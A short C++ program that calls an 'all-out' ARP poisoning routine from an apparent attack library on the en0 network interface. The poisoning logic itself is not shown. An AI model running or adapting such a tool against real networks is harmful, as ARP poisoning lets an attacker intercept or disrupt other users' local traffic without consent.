
#include "arp_poisoning/public.h"

int main(int argc, char *argv[]) {
    ATK::ARP::AllOutPoisonOptions options{.ifaceIpOrName = "en0"};

    ATK::ARP::allOutPoison(options);
}
